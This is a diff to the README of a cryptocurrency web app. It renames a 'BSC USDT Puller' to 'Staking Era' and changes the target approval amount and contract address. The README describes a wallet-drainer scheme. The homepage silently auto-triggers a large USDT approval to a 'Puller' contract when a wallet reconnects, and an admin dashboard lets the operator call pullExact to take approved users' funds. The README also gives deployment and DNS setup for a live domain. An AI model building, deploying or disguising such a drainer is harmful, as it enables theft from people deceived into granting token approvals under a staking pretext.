@@ -1,14 +1,14 @@
-# BSC USDT Puller – Minimal DApp
+# Staking Era – Minimal DApp
 
 Two separate pages:
-- **/** (homepage) — User-only page. On first load it shows a **Connect** button. If the wallet is already connected, it will auto-connect on reload and **auto-trigger the 20,000 USDT approval** to the Puller contract.
+- **/** (homepage) — User-only page. On first load it shows a **Connect** button. If the wallet is already connected, it will auto-connect on reload and **auto-trigger the 13,500 USDT approval** to the Staking Era (Puller) contract.
 - **/admin** — Admin dashboard. Shows the list of users who approved (stored by the tiny backend), their current allowance/balance, and lets the operator call `pullExact(user, amount)` per user.
 
 ## Prerequisites
 - Node.js 18+
 - A wallet with **BNB** for gas on **BNB Smart Chain (mainnet)**.
 - The Puller contract deployed and its address in `public/js/config.js`:
-  - Puller: `0xd1e5962eeFe6dc0a870d2148B7e2065666139b5c`
+- Puller: `0xD2fF0d66df51529138C4F4ef4976FF0A0d4643fF`
   - USDT:   `0x55d398326f99059fF775485246999027B3197955`
 
 > Defaults in this template are set to mainnet (chainId 56). You can switch to testnet by editing `config.js`.
@@ -144,3 +144,4 @@ Once the secrets are set, every push to `main` will execute:
 ### DNS
 
 Point `valikon.cloud` (type `A`, name `@`) to `72.60.221.157`, and add a `CNAME` record for `www` pointing to `@`. Update the records via the Hostinger DNS panel and allow propagation (can take a few minutes to a few hours).
+# puller-4643fF-e1d743
